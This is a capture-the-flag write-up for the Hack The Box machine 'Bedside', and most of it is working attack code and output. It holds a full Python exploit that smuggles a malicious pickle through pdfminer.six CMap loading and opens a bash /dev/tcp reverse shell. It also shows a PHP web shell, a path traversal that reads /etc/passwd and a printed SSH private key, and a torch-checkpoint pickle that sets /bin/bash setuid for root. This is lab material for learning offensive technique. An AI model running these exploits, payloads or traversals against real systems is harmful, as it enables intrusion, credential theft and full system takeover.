# Bedside Linux Medium HTB Machine Writeup

## NMAP Emuneration
```
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.68
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.68 (Debian)
|_http-title: Did not follow redirect to http://bedside.htb/
3000/tcp filtered ppp
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Web Emuneration
```
┌──(jameskaois㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bedside.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.bedside.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 195ms]
:: Progress: [19966/19966] :: Job [1/1] :: 209 req/sec :: Duration: [0:01:34] :: Errors: 0 ::
```
Found `research.bedside.htb`, going in saw an upload functionality allowed `jpeg, jpg, png, bmp, tiff, dcm, pdf, gz, zip`, upload a `.php.png` shell:
```
<?php echo "Shell";system($_GET['cmd']); ?>
```
Got `MIME type mismatch`, seems like doesn't work, then tried to upload several allowed files, to see what can be exploited, when upload `sample.pdf` got:
```
{
	"responseHeaders": {
		"headers": [
			...
			{
				"name": "X-Powered-By",
				"value": "pdfminer.six"
			}
		]
	}
}
```
Searching online found: `CVE-2025-64512` and `CVE-2025-70559`
## Web Exploiting
POC:
```python
#!/usr/bin/env python3

import sys
import os
import gzip
import pickle
import base64
import socket
import threading
import argparse
import time
import requests


def log_info(m):
    print("[*] " + m)


def log_ok(m):
    print("[+] " + m)


def log_err(m):
    print("[-] " + m)


class RCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


def build_pickle(cmd):
    raw = pickle.dumps(RCE(cmd))
    return gzip.compress(raw)


def encode_pdf_name(path):
    out = ""
    for ch in path:
        if ch.isalnum() or ch in ".-_":
            out += ch
        else:
            out += "#%02X" % ord(ch)
    return out


def build_pdf(cmap_name):
    template = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources
<<
/Font
<<
/F1 5 0 R
>>
>>
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(x) Tj
ET
endstream
endobj
5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /F-Identity-H
/Encoding /{replacement}
/DescendantFonts [6 0 R]
>>
endobj
6 0 obj
<<
/Type /Font
/Subtype /CIDFontType2
/BaseFont /F
/CIDSystemInfo
<<
/Registry (Adobe)
/Ordering (Identity)
/Supplement 0
>>
/FontDescriptor 7 0 R
>>
endobj
7 0 obj
<<
/Type /FontDescriptor
/FontName /F
/Flags 4
/FontBBox [-1000 -1000 1000 1000]
/ItalicAngle 0
/Ascent 1000
/Descent -200
/CapHeight 800
/StemV 80
>>
endobj
xref
0 8
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000274 00000 n
0000000370 00000 n
0000000503 00000 n
0000000673 00000 n
trailer
<<
/Size 8
/Root 1 0 R
>>
startxref
871
%%EOF
"""
    return template.format(replacement=cmap_name).encode()


def upload(base, vhost, filename, data):
    files = {"uploadFile": (filename, data)}
    headers = {"Host": vhost}
    r = requests.post(base + "/", files=files, headers=headers, timeout=15)
    return "uploaded successfully" in r.text


def check(base, vhost, filename):
    headers = {"Host": vhost}
    r = requests.get(base + "/uploads/" + filename, headers=headers, timeout=15)
    return r.status_code


def listener(port, flag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    log_info("listener bound on 0.0.0.0:%d" % port)
    conn, addr = s.accept()
    flag["hit"] = True
    log_ok("shell from %s:%d" % addr)
    t = threading.Thread(target=recvloop, args=(conn,), daemon=True)
    t.start()
    while True:
        try:
            data = sys.stdin.readline()
            if not data:
                break
            conn.sendall(data.encode())
        except Exception:
            break


def recvloop(conn):
    while True:
        try:
            data = conn.recv(4096)
            if not data:
                break
            sys.stdout.write(data.decode(errors="replace"))
            sys.stdout.flush()
        except Exception:
            break


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("-L", "--listen", required=True)
    ap.add_argument("--vhost", default="research.bedside.htb")
    ap.add_argument("--path", default=None)
    ap.add_argument("--pickle-name", default="payload.pickle.gz")
    ap.add_argument("--wait", type=float, default=8.0)
    args = ap.parse_args()

    base = "http://" + args.target
    lhost, lport = args.listen.split(":")
    lport = int(lport)

    inner = "bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost, lport)
    b64 = base64.b64encode(inner.encode()).decode()
    cmd = "echo %s | base64 -d | bash" % b64
    log_info("reverse shell command staged for %s:%d" % (lhost, lport))

    pdata = build_pickle(cmd)
    log_info("built pickle payload (%d bytes gz)" % len(pdata))

    if not upload(base, args.vhost, args.pickle_name, pdata):
        log_err("pickle upload rejected")
        sys.exit(1)
    log_ok("uploaded %s" % args.pickle_name)

    code = check(base, args.vhost, args.pickle_name)
    if code == 200:
        log_ok("pickle reachable at /uploads/%s" % args.pickle_name)
    else:
        log_err("pickle not reachable (HTTP %d), continuing anyway" % code)

    if args.path:
        candidates = [args.path]
    else:
        candidates = [
            "/var/www/research.bedside.htb/uploads",
            "/var/www/html/uploads",
            "/var/www/research/uploads",
            "/var/www/html/research/uploads",
            "/var/www/bedside.htb/research/uploads",
            "/app/uploads",
            "/opt/research/uploads",
            "/srv/www/research.bedside.htb/uploads",
            "/var/www/uploads",
        ]

    flag = {"hit": False}
    lt = threading.Thread(target=listener, args=(lport, flag), daemon=True)
    lt.start()
    time.sleep(1)

    stem = args.pickle_name[:-len(".pickle.gz")] if args.pickle_name.endswith(".pickle.gz") else args.pickle_name

    for i, path in enumerate(candidates):
        if flag["hit"]:
            break
        cmap_target = path.rstrip("/") + "/" + stem
        name = encode_pdf_name(cmap_target)
        pdf = build_pdf(name)
        pdfname = "trigger%d.pdf" % i
        log_info("trying path %s" % cmap_target)
        if not upload(base, args.vhost, pdfname, pdf):
            log_err("pdf upload rejected for %s" % path)
            continue
        log_ok("uploaded %s -> waiting %.0fs for worker" % (pdfname, args.wait))
        waited = 0.0
        while waited < args.wait and not flag["hit"]:
            time.sleep(0.5)
            waited += 0.5

    if flag["hit"]:
        log_ok("foothold established, interact below")
        while True:
            time.sleep(1)
    else:
        log_err("no shell caught, path list exhausted; supply --path with the correct uploads dir")


if __name__ == "__main__":
    main()
```
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/bedside]
└─$ python3 exploit.py  -L 10.10.15.106:4444 --vhost research.bedside.htb research.bedside.htb
[*] reverse shell command staged for 10.10.15.106:4444
[*] built pickle payload (125 bytes gz)
[+] uploaded payload.pickle.gz
[+] pickle reachable at /uploads/payload.pickle.gz
[*] listener bound on 0.0.0.0:4444
[*] trying path /var/www/research.bedside.htb/uploads/payload
[+] uploaded trigger0.pdf -> waiting 8s for worker
[*] trying path /var/www/html/uploads/payload
[+] uploaded trigger1.pdf -> waiting 8s for worker
[+] shell from 10.129.15.35:57050
datawrangler@data-wrangler:/app$ [+] foothold established, interact below
id
id
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
```
## Get user flag
In `datawrangler` cannot run any commands like `sudo, ss, netstat, ...`. In `/tmp`, there is a `portscan.sh`:
```bash
datawrangler@data-wrangler:/tmp$ bash portscan.sh 127.0.0.1
bash portscan.sh 127.0.0.1
22
80
3000
Open ports on 127.0.0.1:
22
80
3000
datawrangler@data-wrangler:/tmp$ 
```
Port 3000 is open, Path Traversal through it:
```bash
datawrangler@data-wrangler:/app$ curl -s "http://172.17.0.1:3000/..%2f..%2f..%2f..%2fetc%2fpasswd"
curl -s "http://172.17.0.1:3000/..%2f..%2f..%2f..%2fetc%2fpasswd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
_laurel:x:987:987::/var/log/laurel:/bin/false
polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin
```
Get the SSH Key of the `developer` user:
```bash
datawrangler@data-wrangler:/app$ curl -s "http://172.17.0.1:3000/..%2F..%2F..%2F..%2Fhome%2Fdeveloper%2F.ssh%2Fid_rsa"
curl -s "http://172.17.0.1:3000/..%2F..%2F..%2F..%2Fhome%2Fdeveloper%2F.ssh%2Fid_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```
```bash
developer@bedside:~$ ls
projects  user.txt
developer@bedside:~$ cat user.txt
11218906248bb0dad22cb0c0df0b0174
```
## Privilege Escalation
```bash
developer@bedside:~$ sudo -l
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```
`bedside_trainer.py`:
```python
#!/usr/bin/env python3
"""
Bedside Clinic - MONAI trainer (v0.1.0-beta)

This software is an internal beta release intended for use by company staff and developers
for testing, experimentation, and development purposes only.

Key points:

- Staff must **exercise caution** and ensure proper backups of any data used with this tool.
- This tool should **not be used for clinical decision-making** or in patient care.
- Further development, testing, and validation are required before any production deployment.

Usage:
    python bedside_trainer.py [--epochs N] [--batch-size N] [--lr LR] [--scanner /dev/usbscanner0]

Notes:
- Root access is required if specifying a hardware scanner.
- RAW_DIR is currently a placeholder for future integration. Preprocessing features will be added in the future to handle more complex files (DICOM, NIfTI, etc.)
- Current data flow is as follows: [staging/] > [processed/] > (DataLoader) > model
- Script is currently fully functional with image files (jpeg, png, etc.). Refer to allowed extensions for supported types. 

"""

import os
import sys
import shutil
import argparse
from pathlib import Path
from datetime import datetime
import logging
import warnings
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.tensorboard import SummaryWriter
from torch.utils.data import DataLoader

# MONAI imports
warnings.filterwarnings("ignore", category=FutureWarning)
from monai.data import Dataset, CacheDataset
from monai.transforms import (
    Compose, LoadImaged, EnsureChannelFirstd, ScaleIntensityd,
    RandSpatialCropd, ToTensord, EnsureTyped, ResizeWithPadOrCropd
)
from monai.handlers import CheckpointLoader  # <-- Correct import

# --------------------------
# Datastore paths
# --------------------------
DATASTORE_ROOT = Path("/datastore")
CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
LOGS_DIR = DATASTORE_ROOT / "logs"
MODELS_DIR = DATASTORE_ROOT / "models"
PROCESSED_DIR = DATASTORE_ROOT / "processed"
RAW_DIR = DATASTORE_ROOT / "raw"
STAGING_DIR = DATASTORE_ROOT / "staging"

for d in (CHECKPOINT_DIR, LOGS_DIR, MODELS_DIR, PROCESSED_DIR, RAW_DIR, STAGING_DIR):
    d.mkdir(parents=True, exist_ok=True)

# --------------------------
# Logging setup
# --------------------------
log_file = LOGS_DIR / f"training_{datetime.now().strftime('%Y%m%d-%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# --------------------------
# File types
# --------------------------
ALLOWED_EXTS = {
    "jpeg", "jpg", "png", "bmp", "tiff", "tif",
    "gif", "dcm", "ima", "mhd", "raw", "nrrd",
    "nii", "gz", "hdr", "img", "zip", "tar", "tar.gz", "7z",
    "pdf", "txt", "npy"
}

# --------------------------
# Device
# --------------------------
DEVICE = torch.device("cuda" if torch.cuda.is_available() else "cpu")

# --------------------------
# Utility functions
# --------------------------
def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None

def is_nifti(p: Path):
    return p.suffix in (".nii", ".gz") and (p.name.endswith(".nii") or p.name.endswith(".nii.gz"))

def collect_processed_files(processed_dir: Path, limit=None):
    files = [p for p in processed_dir.glob("**/*") if p.is_file() and p.suffix.lower().lstrip(".") in ALLOWED_EXTS]
    if limit:
        files = files[:limit]
    return [{"image": str(p)} for p in files]

def conservative_promote_from_staging(staging_dir: Path, processed_dir: Path, max_files=100):
    promoted = 0
    for p in sorted(staging_dir.iterdir()):
        if promoted >= max_files:
            break
        if not p.is_file():
            continue
        ext = p.suffix.lower().lstrip(".")
        if ext in ALLOWED_EXTS:
            dest = processed_dir / p.name
            try:
                shutil.move(str(p), str(dest))
                promoted += 1
            except Exception as e:
                logger.warning(f"Failed to promote {p}: {e}")
    return promoted

def prepare_dataloader_from_processed(processed_dir: Path, batch_size: int):
    data = collect_processed_files(processed_dir)
    if not data:
        return None, 0

    contains_nifti = any(is_nifti(Path(d["image"])) for d in data)

    if contains_nifti:
        transforms = Compose([
            LoadImaged(keys=["image"]),
            EnsureChannelFirstd(keys=["image"]),
            ScaleIntensityd(keys=["image"]),
            RandSpatialCropd(keys=["image"], roi_size=(64,64,64), random_size=False),
            EnsureTyped(keys=["image"])
        ])
        dataset = CacheDataset(data=data, transform=transforms, cache_rate=1.0, num_workers=1)
    else:
        transforms = Compose([
            LoadImaged(keys=["image"]),
            EnsureChannelFirstd(keys=["image"]),
            ScaleIntensityd(keys=["image"]),
            ResizeWithPadOrCropd(keys=["image"], spatial_size=(64,64)),
            ToTensord(keys=["image"]),
            EnsureTyped(keys=["image"])
        ])
        dataset = Dataset(data=data, transform=transforms)

    dataloader = DataLoader(dataset, batch_size=batch_size, shuffle=True, num_workers=1)
    return dataloader, len(data)

def build_model(dataloader=None, hidden_dim=128):
    if dataloader is None:
        raise ValueError("Dataloader must be provided to infer input size.")
    sample_batch = next(iter(dataloader))["image"].to(torch.device("cpu"))
    n_features = sample_batch.numel() // sample_batch.shape[0]
    logger.info(f"Auto-detected input features: {n_features}")
    model = nn.Sequential(
        nn.Flatten(),
        nn.Linear(n_features, hidden_dim),
        nn.ReLU(),
        nn.Linear(hidden_dim, 1)
    )
    return model

# --------------------------
# Main
# --------------------------
def main():
    parser = argparse.ArgumentParser(description="MONAI trainer with datastore integration")
    parser.add_argument("--epochs", "-e", type=int, default=50, help="Number of training epochs")
    parser.add_argument("--batch-size", "-b", type=int, default=4, help="Batch size")
    parser.add_argument("--lr", type=float, default=1e-3, help="Learning rate")
    parser.add_argument("--scanner", type=str, default=None, help="Hardware scanner device (requires root)")
    args = parser.parse_args()

    if args.scanner and os.geteuid() != 0:
        logger.error("Root access required to use a hardware scanner. Exiting.")
        sys.exit(1)

    NUM_EPOCHS = args.epochs
    BATCH_SIZE = args.batch_size
    LEARNING_RATE = args.lr
    SAVE_INTERVAL = 5

    logger.info(f"Device: {DEVICE}")

    dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
    if n_data == 0:
        promoted = conservative_promote_from_staging(STAGING_DIR, PROCESSED_DIR, max_files=200)
        if promoted:
            logger.info(f"Promoted {promoted} files from staging -> processed")
            dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
        else:
            logger.warning("No data available to train. Exiting.")
            return

    logger.info(f"Using {n_data} samples for training.")

    model = build_model(dataloader).to(DEVICE)
    optimizer = optim.Adam(model.parameters(), lr=LEARNING_RATE)
    loss_fn = nn.MSELoss()

    # --------------------------
    # Checkpoint loading (MONAI-compatible callable form)
    # --------------------------
    latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
    start_epoch = 0
    if latest_ckpt:
        logger.info(f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader (callable mode)...")
        loader = CheckpointLoader(
            load_path=str(latest_ckpt),
            load_dict={"model": model, "optimizer": optimizer},
            map_location=DEVICE
        )

        # Minimal mock engine for MONAI handler compatibility
        class MockEngine:
            def __init__(self):
                self.state = type("State", (), {})()
                self.state.max_epochs = None
                self.state.epoch = 0

        engine = MockEngine()
        loader(engine)  # invoke the handler directly

        # Retrieve saved epoch if available
        if hasattr(engine.state, "epoch") and engine.state.epoch:
            start_epoch = engine.state.epoch
        elif hasattr(loader, "loaded_objects") and "epoch" in loader.loaded_objects:
            start_epoch = loader.loaded_objects["epoch"]

        logger.info(f"Resuming from epoch {start_epoch}")

    writer = SummaryWriter(log_dir=str(LOGS_DIR / datetime.now().strftime("%Y%m%d-%H%M%S")))

    # Training loop
    for epoch in range(start_epoch, NUM_EPOCHS):
        model.train()
        epoch_loss = 0.0
        for batch in dataloader:
            imgs = batch["image"].to(DEVICE)
            target = torch.zeros((imgs.shape[0], 1), device=DEVICE)

            optimizer.zero_grad()
            out = model(imgs)
            loss = loss_fn(out, target)
            loss.backward()
            optimizer.step()
            epoch_loss += float(loss.item())

        avg_loss = epoch_loss / max(1, len(dataloader))
        logger.info(f"[EPOCH {epoch+1}/{NUM_EPOCHS}] avg_loss: {avg_loss:.6f}")

        if (epoch + 1) % SAVE_INTERVAL == 0 or (epoch + 1) == NUM_EPOCHS:
            ckpt_payload = {
                "epoch": epoch + 1,
                "model": model.state_dict(),
                "optimizer": optimizer.state_dict()
            }
            ckpt_name = CHECKPOINT_DIR / f"checkpoint_epoch_{epoch+1}.pt"
            torch.save(ckpt_payload, ckpt_name)
            logger.info(f"Saved checkpoint: {ckpt_name}")

    # Save final model
    final_model_file = MODELS_DIR / f"final_model_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pt"
    torch.save({"model": model.state_dict()}, final_model_file)
    logger.info(f"Saved final model: {final_model_file}")
    logger.info("Training completed.")
    writer.close()


if __name__ == "__main__":
    main()
```
1. The goal in exploiting this script is to trigger checkpoint execution before any error occurs
2. Generate payload:
```python
import torch, os

class Exploit:
    def __reduce__(self):
        cmd = "chmod a+s /bin/bash"
        return (__import__('os').system, (cmd,))

payload = {"epoch": 999, "model": Exploit(), "optimizer": {}}
torch.save(payload, "malicious_checkpoint.pt")
```
Placed payload in `/datastore/checkpoints` using `datawrangler` user, then:
3. Move random .jpg file into container using datawrangler account (place it in /tmp or whereever you like)
4. Then as datawrangler execute:
    `rm -rf /datastore/staging/* /datastore/processed/* && cp /tmp/random.jpg /datastore/processed/`

5. Then immediately execute as developer:
    `sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py`
## Get root flag
```bash
developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
2026-07-20 07:58:27,485 | INFO | Device: cpu
2026-07-20 07:58:27,486 | INFO | Using 1 samples for training.
2026-07-20 07:58:27,588 | INFO | Auto-detected input features: 12288
2026-07-20 07:58:27,600 | INFO | Found checkpoint /datastore/checkpoints/malicious.pt, loading with CheckpointLoader (callable mode)...
Traceback (most recent call last):
  File "/opt/trainer/bedside_trainer.py", line 276, in <module>
    main()
    ~~~~^^
  File "/opt/trainer/bedside_trainer.py", line 227, in main
    loader(engine)  # invoke the handler directly
    ~~~~~~^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/monai/handlers/checkpoint_loader.py", line 146, in __call__
    Checkpoint.load_objects(to_load=self.load_dict, checkpoint=checkpoint, strict=self.strict)
    ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/ignite/handlers/checkpoint.py", line 624, in load_objects
    _tree_apply2(_load_object, to_load, checkpoint_obj)
    ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/ignite/utils.py", line 209, in _tree_apply2
    _tree_apply2(func, _CollectionItem.wrap(x, k, v), y[k])
    ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/ignite/utils.py", line 216, in _tree_apply2
    return func(x, y)
  File "/usr/local/lib/python3.13/dist-packages/ignite/handlers/checkpoint.py", line 613, in _load_object
    obj.load_state_dict(chkpt_obj, **kwargs)
    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.13/dist-packages/torch/nn/modules/module.py", line 2516, in load_state_dict
    raise TypeError(
        f"Expected state_dict to be dict-like, got {type(state_dict)}."
    )
TypeError: Expected state_dict to be dict-like, got <class 'int'>.
developer@bedside:~$ bash -p
bash-5.2# id
uid=1000(developer) gid=1000(developer) euid=0(root) egid=0(root) groups=0(root),100(users),1000(developer)
bash-5.2# cat /root/root.txt
ce5b784c63d48275437142e81c2d1582
bash-5.2# 
```